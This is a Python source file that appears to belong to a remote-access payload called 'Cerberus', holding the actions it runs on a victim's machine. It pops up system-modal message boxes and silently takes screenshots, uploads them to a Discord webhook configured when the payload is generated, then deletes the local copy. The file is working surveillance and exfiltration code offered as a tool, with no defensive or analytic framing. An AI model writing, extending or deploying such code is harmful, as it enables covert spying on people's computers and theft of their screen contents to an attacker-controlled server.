# F:/Cerebus/live_payload_components/payload_actions.py
import os
import platform
import time
import ctypes # For message box and potentially wallpaper
from mss import mss # For screenshots
import requests # For uploading screenshot to Discord (using the results webhook)
import traceback

# This RESULTS_WEBHOOK_URL will be set dynamically when the payload script is generated
# It's the same webhook used for the initial system info report.
RESULTS_WEBHOOK_URL = None 
PAYLOAD_INSTANCE_ID = None # This will also be set dynamically

def _send_action_status(action_name, status, details="", color=0x00FF00, files=None):
    """Helper to send a status update back to the results webhook."""
    if not RESULTS_WEBHOOK_URL:
        print(f"[Action Status] No results webhook URL configured. Cannot send status for {action_name}.")
        return

    embed = {
        "title": f"Action Status: {action_name} (ID: {PAYLOAD_INSTANCE_ID[:8] if PAYLOAD_INSTANCE_ID else 'N/A'})",
        "description": f"**Status:** {status}",
        "color": color, # Green for success, Red for error
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
        "fields": []
    }
    if details:
        embed["fields"].append({"name": "Details", "value": str(details)[:1020], "inline": False})

    payload_json = {"embeds": [embed]}
    
    try:
        if files: # files should be a list of file paths
            opened_files = []
            files_to_send = {}
            # Discord's `requests` library expects files in a specific format for multipart/form-data
            # {'file_N': ('filename.ext', file_object, 'content_type')}
            # For a single embed with files, we also need 'payload_json'
            files_to_send['payload_json'] = (None, json.dumps(payload_json), 'application/json')

            for i, file_path in enumerate(files):
                if os.path.exists(file_path):
                    f_obj = open(file_path, 'rb')
                    opened_files.append(f_obj)
                    files_to_send[f'file{i}'] = (os.path.basename(file_path), f_obj, 'application/octet-stream')
                else:
                    print(f"[Action Status] File not found for upload: {file_path}")
            
            if len(opened_files) > 0: # Only send if there are actual files to send
                response = requests.post(RESULTS_WEBHOOK_URL, files=files_to_send, timeout=60)
            else: # No valid files, send embed only
                 response = requests.post(RESULTS_WEBHOOK_URL, json=payload_json, timeout=15)

            for f_obj in opened_files:
                f_obj.close()
        else:
            response = requests.post(RESULTS_WEBHOOK_URL, json=payload_json, timeout=15)
        
        response.raise_for_status()
        print(f"[Action Status] Successfully sent status for {action_name}.")
    except Exception as e:
        print(f"[Action Status] Error sending status for {action_name}: {e}\n{traceback.format_exc()}")


def show_message_box(title="Message", text="Hello from Cerberus Payload!"):
    """Displays a message box on the host PC."""
    action_name = "Show Message Box"
    print(f"[Payload Action] Attempting to show message box: Title='{title}', Text='{text}'")
    try:
        # For Windows
        if platform.system() == "Windows":
            # MB_OK = 0x00000000
            # MB_ICONINFORMATION = 0x00000040
            # MB_SYSTEMMODAL = 0x00001000 (to make it always on top)
            ctypes.windll.user32.MessageBoxW(None, str(text), str(title), 0x00000040 | 0x00001000) 
            _send_action_status(action_name, "Success", f"Message box displayed: Title='{title}'")
            return True
        else:
            # Basic cross-platform might involve trying tkinter or just logging
            # For simplicity, we'll say it's Windows-only for now via ctypes
            msg = "Message box functionality currently only implemented for Windows."
            print(f"[Payload Action] {msg}")
            _send_action_status(action_name, "Skipped", msg, color=0xFFA500) # Orange for skipped
            return False
    except Exception as e:
        err_msg = f"Failed to show message box: {e}"
        print(f"[Payload Action] {err_msg}\n{traceback.format_exc()}")
        _send_action_status(action_name, "Error", err_msg, color=0xFF0000)
        return False


def take_screenshot():
    """Takes a screenshot of the host PC and uploads it to Discord."""
    action_name = "Take Screenshot"
    print("[Payload Action] Attempting to take screenshot...")
    screenshot_path = None
    try:
        # Create a temporary path for the screenshot
        # Using a fixed name in the temp directory for simplicity.
        # A more robust solution would use tempfile module.
        if platform.system() == "Windows":
            temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
        else: # Linux/MacOS
            temp_dir = "/tmp"
        
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True) # Create if it doesn't exist

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        # Use PAYLOAD_INSTANCE_ID to make filename more unique if multiple payloads run
        id_prefix = PAYLOAD_INSTANCE_ID[:8] if PAYLOAD_INSTANCE_ID else "unknown"
        screenshot_filename = f"cerberus_screenshot_{id_prefix}_{timestamp}.png"
        screenshot_path = os.path.join(temp_dir, screenshot_filename)

        with mss() as sct:
            sct.shot(output=screenshot_path)
        
        if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
            print(f"[Payload Action] Screenshot saved to: {screenshot_path}")
            # Upload the screenshot
            _send_action_status(action_name, "Success", f"Screenshot taken and saved locally. Attempting upload...", files=[screenshot_path])
            return True # Assuming upload success is handled by _send_action_status
        else:
            err_msg = "Screenshot file not created or is empty."
            print(f"[Payload Action] {err_msg}")
            _send_action_status(action_name, "Error", err_msg, color=0xFF0000)
            return False
    except Exception as e:
        err_msg = f"Failed to take screenshot: {e}"
        print(f"[Payload Action] {err_msg}\n{traceback.format_exc()}")
        _send_action_status(action_name, "Error", err_msg, color=0xFF0000)
        return False
    finally:
        # Clean up the local screenshot file after attempting to send
        if screenshot_path and os.path.exists(screenshot_path):
            try:
                # Add a small delay to ensure file is released if requests is slow
                time.sleep(1) 
                os.remove(screenshot_path)
                print(f"[Payload Action] Cleaned up local screenshot: {screenshot_path}")
            except Exception as e_del:
                print(f"[Payload Action] Error cleaning up screenshot {screenshot_path}: {e_del}")

# --- Placeholder for other actions ---
# def change_wallpaper(image_url):
#     action_name = "Change Wallpaper"
#     print(f"[Payload Action] Attempting to change wallpaper using URL: {image_url}")
#     _send_action_status(action_name, "Pending", "Not yet implemented.")
#     return False

# def open_url_in_browser(url_to_open):
#     action_name = "Open URL"
#     print(f"[Payload Action] Attempting to open URL: {url_to_open}")
#     _send_action_status(action_name, "Pending", "Not yet implemented.")
#     return False

# This import needs to be here for _send_action_status if files are involved
import json